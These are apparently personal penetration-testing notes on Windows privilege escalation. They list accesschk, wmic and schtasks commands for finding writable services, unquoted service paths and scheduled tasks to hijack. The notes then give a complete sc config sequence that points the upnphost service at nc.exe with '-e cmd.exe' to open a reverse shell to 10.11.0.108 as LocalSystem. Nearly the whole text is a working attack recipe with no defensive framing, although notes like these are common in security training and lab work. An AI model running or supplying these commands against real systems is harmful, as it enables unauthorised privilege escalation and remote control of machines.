accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Administrators" * /accepteula
accesschk.exe -uwcqv "System" * /accepteula
accesschk.exe -uwcqv "Bob" * /accepteula
accesschk.exe -ucqv <service name> * /accepteula

you can also check for unqouted service path like this with wmic. maybe lets u dll hijack
wmic service get name,startname,pathname | findstr /i " C:.*LocalSystem"

task hijack
schtasks /query /fo List /v | findstr /i " c:"


find writeable service.
lets say we found writable upnphost 
the sc config upnphost depend= RPCSS might not be necessary, if u get error codes on startup google them. some of these codes are easy to resolve



sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv 10.11.0.108 22 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= RPCSS 
net start upnphost


